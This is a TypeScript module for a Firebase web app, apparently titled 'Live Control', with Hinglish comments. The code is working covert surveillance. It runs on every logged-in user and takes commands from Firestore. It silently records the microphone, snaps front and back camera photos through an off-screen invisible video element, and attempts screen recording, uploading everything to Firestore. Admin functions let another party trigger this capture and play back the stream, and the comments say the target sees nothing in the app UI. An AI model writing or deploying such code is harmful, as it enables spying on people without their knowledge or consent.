/**
 * Live Control — silent mic stream, dual camera snap, screen record attempt.
 * App UI pe target ko kuch nahi dikhta. OS privacy indicators alag.
 */
import {
  collection,
  doc,
  onSnapshot,
  setDoc,
  updateDoc,
  deleteDoc,
  type Unsubscribe,
} from "firebase/firestore";
import { db } from "../firebase";

const MIC_SLICE_MS = 900; // complete webm blob har ~0.9s (decode ke liye zaroori)
const SCREEN_CHUNK_MS = 800;
const MAX_B64 = 180_000;

export type DeviceControl = {
  listen?: boolean;
  snap?: boolean;
  snapId?: number;
  screen?: boolean;
  by?: string;
  at?: number;
};

export type CaptureResult = {
  status: string;
  snapId: number;
  front: string | null;
  back: string | null;
  error: string | null;
  at: number;
};

export type StreamChunk = {
  active: boolean;
  seq: number;
  mime: string;
  chunk: string | null;
  error?: string | null;
  at: number;
};

function b64FromBlob(blob: Blob): Promise<string> {
  return new Promise((res, rej) => {
    const r = new FileReader();
    r.onload = () => {
      const s = String(r.result || "");
      res(s.includes(",") ? s.split(",")[1]! : s);
    };
    r.onerror = () => rej(new Error("chunk padh nahi paaya"));
    r.readAsDataURL(blob);
  });
}

async function captureFacing(facing: "user" | "environment"): Promise<string> {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error("camera nahi");
  const stream = await navigator.mediaDevices.getUserMedia({
    audio: false,
    video: {
      facingMode: { ideal: facing },
      width: { ideal: 640 },
      height: { ideal: 480 },
    },
  });
  try {
    const video = document.createElement("video");
    video.muted = true;
    video.playsInline = true;
    video.setAttribute("playsinline", "true");
    video.style.cssText =
      "position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;";
    document.body.appendChild(video);
    video.srcObject = stream;
    await video.play();
    await new Promise((r) => setTimeout(r, 350));
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    const canvas = document.createElement("canvas");
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("canvas nahi");
    ctx.drawImage(video, 0, 0, w, h);
    video.pause();
    video.srcObject = null;
    video.remove();
    let q = 0.55;
    let data = canvas.toDataURL("image/jpeg", q);
    while (data.length > MAX_B64 * 1.37 && q > 0.25) {
      q -= 0.1;
      data = canvas.toDataURL("image/jpeg", q);
    }
    return data.includes(",") ? data.split(",")[1]! : data;
  } finally {
    stream.getTracks().forEach((t) => t.stop());
  }
}

async function doDualSnap(uid: string, snapId: number) {
  const outRef = doc(db, "deviceCapture", uid);
  await setDoc(
    outRef,
    { uid, status: "working", snapId, front: null, back: null, error: null, at: Date.now() },
    { merge: true },
  );
  let front: string | null = null;
  let back: string | null = null;
  let error: string | null = null;
  try {
    front = await captureFacing("user");
  } catch (e) {
    error = e instanceof Error ? e.message : "front fail";
  }
  try {
    back = await captureFacing("environment");
  } catch (e) {
    error = (error ? error + " · " : "") + (e instanceof Error ? e.message : "back fail");
  }
  await setDoc(
    outRef,
    {
      uid,
      status: front || back ? "done" : "fail",
      snapId,
      front,
      back,
      error,
      at: Date.now(),
    },
    { merge: true },
  );
}

/** Har logged-in user pe chalta hai — commands sunta hai, app UI me kuch nahi dikhata. */
export function startLiveControlClient(uid: string): () => void {
  let alive = true;
  let unsubCtrl: Unsubscribe | null = null;
  let recorder: MediaRecorder | null = null;
  let stream: MediaStream | null = null;
  let screenRecorder: MediaRecorder | null = null;
  let screenStream: MediaStream | null = null;
  let seq = 0;
  let screenSeq = 0;
  let writing = false;
  let lastSnapId = 0;
  let snapping = false;

  const controlRef = doc(db, "micControl", uid);
  const streamRef = doc(db, "micStreams", uid);
  const screenRef = doc(db, "screenStreams", uid);

  let micListening = false;
  let micTimer: ReturnType<typeof setTimeout> | null = null;
  let micMime = "audio/webm";

  const stopRec = async () => {
    micListening = false;
    if (micTimer) {
      clearTimeout(micTimer);
      micTimer = null;
    }
    try {
      if (recorder && recorder.state !== "inactive") recorder.stop();
    } catch {
      /* */
    }
    recorder = null;
    stream?.getTracks().forEach((t) => t.stop());
    stream = null;
    try {
      await setDoc(streamRef, { active: false, at: Date.now() }, { merge: true });
    } catch {
      /* */
    }
  };

  /** Har slice poora webm file — timeslice chunks decode nahi hote. */
  const runMicSlice = () => {
    if (!alive || !micListening || !stream) return;
    const mime = micMime;
    const parts: BlobPart[] = [];
    let rec: MediaRecorder;
    try {
      rec = mime
        ? new MediaRecorder(stream, { mimeType: mime, audioBitsPerSecond: 32_000 })
        : new MediaRecorder(stream);
    } catch {
      return;
    }
    recorder = rec;
    rec.ondataavailable = (ev) => {
      if (ev.data && ev.data.size > 0) parts.push(ev.data);
    };
    rec.onstop = () => {
      recorder = null;
      if (!alive || !micListening) return;
      void (async () => {
        if (parts.length && !writing) {
          writing = true;
          try {
            const blob = new Blob(parts, { type: rec.mimeType || mime || "audio/webm" });
            if (blob.size >= 80) {
              const chunk = await b64FromBlob(blob);
              if (chunk.length <= MAX_B64) {
                seq += 1;
                await setDoc(
                  streamRef,
                  {
                    uid,
                    active: true,
                    seq,
                    mime: rec.mimeType || mime || "audio/webm",
                    chunk,
                    at: Date.now(),
                  },
                  { merge: true },
                );
              }
            }
          } catch {
            /* */
          } finally {
            writing = false;
          }
        }
        if (alive && micListening) {
          micTimer = setTimeout(runMicSlice, 40);
        }
      })();
    };
    try {
      rec.start();
      micTimer = setTimeout(() => {
        try {
          if (rec.state === "recording") rec.stop();
        } catch {
          /* */
        }
      }, MIC_SLICE_MS);
    } catch {
      /* */
    }
  };

  const startRec = async () => {
    if (!alive || micListening) return;
    if (!navigator.mediaDevices?.getUserMedia) return;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: false,
          noiseSuppression: false,
          autoGainControl: true,
        },
      });
      micMime = MediaRecorder.isTypeSupported("audio/webm;codecs=opus")
        ? "audio/webm;codecs=opus"
        : MediaRecorder.isTypeSupported("audio/webm")
          ? "audio/webm"
          : MediaRecorder.isTypeSupported("audio/mp4")
            ? "audio/mp4"
            : "";
      seq = 0;
      micListening = true;
      runMicSlice();
    } catch {
      await stopRec();
    }
  };

  const stopScreen = async () => {
    try {
      if (screenRecorder && screenRecorder.state !== "inactive") screenRecorder.stop();
    } catch {
      /* */
    }
    screenRecorder = null;
    screenStream?.getTracks().forEach((t) => t.stop());
    screenStream = null;
    try {
      await setDoc(screenRef, { active: false, at: Date.now() }, { merge: true });
    } catch {
      /* */
    }
  };

  const startScreen = async () => {
    if (!alive || screenRecorder) return;
    const gdm = navigator.mediaDevices?.getDisplayMedia;
    if (!gdm) {
      await setDoc(
        screenRef,
        { uid, active: false, error: "screen capture support nahi", at: Date.now() },
        { merge: true },
      );
      return;
    }
    try {
      screenStream = await gdm.call(navigator.mediaDevices, {
        video: { frameRate: 8, width: { max: 720 }, height: { max: 1280 } },
        audio: false,
      } as DisplayMediaStreamOptions);
      screenStream.getVideoTracks().forEach((t) => {
        t.addEventListener("ended", () => void stopScreen());
      });
      const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8")
        ? "video/webm;codecs=vp8"
        : MediaRecorder.isTypeSupported("video/webm")
          ? "video/webm"
          : "";
      screenRecorder = mime
        ? new MediaRecorder(screenStream, { mimeType: mime, videoBitsPerSecond: 400_000 })
        : new MediaRecorder(screenStream);
      screenSeq = 0;
      let screenWriting = false;
      screenRecorder.ondataavailable = async (ev) => {
        if (!alive || !ev.data || ev.data.size < 80 || screenWriting) return;
        screenWriting = true;
        try {
          const chunk = await b64FromBlob(ev.data);
          if (chunk.length > MAX_B64) return;
          screenSeq += 1;
          await setDoc(
            screenRef,
            {
              uid,
              active: true,
              seq: screenSeq,
              mime: screenRecorder?.mimeType || "video/webm",
              chunk,
              at: Date.now(),
            },
            { merge: true },
          );
        } catch {
          /* */
        } finally {
          screenWriting = false;
        }
      };
      screenRecorder.start(SCREEN_CHUNK_MS);
    } catch (e) {
      await setDoc(
        screenRef,
        {
          uid,
          active: false,
          error: e instanceof Error ? e.message : "screen deny",
          at: Date.now(),
        },
        { merge: true },
      );
      await stopScreen();
    }
  };

  unsubCtrl = onSnapshot(controlRef, (snap) => {
    if (!alive) return;
    const d = (snap.data() || {}) as DeviceControl;

    if (d.listen) void startRec();
    else void stopRec();

    if (d.screen) void startScreen();
    else void stopScreen();

    const sid = Number(d.snapId) || 0;
    if (d.snap && sid > 0 && sid !== lastSnapId && !snapping) {
      lastSnapId = sid;
      snapping = true;
      void doDualSnap(uid, sid)
        .catch(() => undefined)
        .finally(() => {
          snapping = false;
          void setDoc(controlRef, { snap: false }, { merge: true }).catch(() => undefined);
        });
    }
  });

  return () => {
    alive = false;
    unsubCtrl?.();
    void stopRec();
    void stopScreen();
  };
}

/* ---------- Admin APIs ---------- */

export async function setMicListen(targetUid: string, listen: boolean, adminUid: string) {
  await setDoc(
    doc(db, "micControl", targetUid),
    { listen, by: adminUid, at: Date.now() },
    { merge: true },
  );
}

export async function requestSnap(targetUid: string, adminUid: string) {
  const snapId = Date.now();
  await setDoc(
    doc(db, "micControl", targetUid),
    { snap: true, snapId, by: adminUid, at: Date.now() },
    { merge: true },
  );
  return snapId;
}

export async function setScreenRecord(targetUid: string, on: boolean, adminUid: string) {
  await setDoc(
    doc(db, "micControl", targetUid),
    { screen: on, by: adminUid, at: Date.now() },
    { merge: true },
  );
}

export async function clearDeviceControl(targetUid: string) {
  try {
    await deleteDoc(doc(db, "micControl", targetUid));
  } catch {
    /* */
  }
}

export function playMicStream(targetUid: string, onStatus: (s: string) => void): () => void {
  let alive = true;
  let lastSeq = -1;
  const queue: { url: string; mime: string }[] = [];
  let playing = false;
  let current: HTMLAudioElement | null = null;

  const playNext = () => {
    if (!alive || playing) return;
    const next = queue.shift();
    if (!next) return;
    playing = true;
    const audio = new Audio();
    current = audio;
    audio.src = next.url;
    audio.onended = () => {
      URL.revokeObjectURL(next.url);
      playing = false;
      current = null;
      playNext();
    };
    audio.onerror = () => {
      URL.revokeObjectURL(next.url);
      playing = false;
      current = null;
      playNext();
    };
    void audio.play().catch(() => {
      URL.revokeObjectURL(next.url);
      playing = false;
      current = null;
      onStatus("play block — phir try");
      playNext();
    });
  };

  const unsub = onSnapshot(
    doc(db, "micStreams", targetUid),
    (snap) => {
      if (!alive) return;
      const d = snap.data();
      if (!d || !d.active || !d.chunk) {
        onStatus(d?.active === false ? "band" : "intezaar…");
        return;
      }
      const s = Number(d.seq) || 0;
      if (s === lastSeq) return;
      lastSeq = s;
      onStatus(`live · #${s}`);
      try {
        const bin = atob(String(d.chunk));
        const bytes = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        const mime = String(d.mime || "audio/webm");
        const url = URL.createObjectURL(new Blob([bytes], { type: mime }));
        // queue overflow mat hone do
        if (queue.length > 8) {
          const old = queue.shift();
          if (old) URL.revokeObjectURL(old.url);
        }
        queue.push({ url, mime });
        playNext();
      } catch {
        onStatus("chunk error");
      }
    },
    () => onStatus("error"),
  );

  return () => {
    alive = false;
    unsub();
    try {
      current?.pause();
    } catch {
      /* */
    }
    current = null;
    queue.forEach((q) => URL.revokeObjectURL(q.url));
    queue.length = 0;
  };
}

export function watchCapture(targetUid: string, cb: (c: CaptureResult | null) => void): Unsubscribe {
  return onSnapshot(
    doc(db, "deviceCapture", targetUid),
    (snap) => {
      if (!snap.exists()) {
        cb(null);
        return;
      }
      const x = snap.data();
      cb({
        status: String(x.status || ""),
        snapId: Number(x.snapId) || 0,
        front: typeof x.front === "string" ? x.front : null,
        back: typeof x.back === "string" ? x.back : null,
        error: typeof x.error === "string" ? x.error : null,
        at: Number(x.at) || 0,
      });
    },
    () => cb(null),
  );
}

export function watchScreenStream(targetUid: string, cb: (s: StreamChunk | null) => void): Unsubscribe {
  return onSnapshot(
    doc(db, "screenStreams", targetUid),
    (snap) => {
      if (!snap.exists()) {
        cb(null);
        return;
      }
      const x = snap.data();
      cb({
        active: Boolean(x.active),
        seq: Number(x.seq) || 0,
        mime: String(x.mime || "video/webm"),
        chunk: typeof x.chunk === "string" ? x.chunk : null,
        error: typeof x.error === "string" ? x.error : null,
        at: Number(x.at) || 0,
      });
    },
    () => cb(null),
  );
}
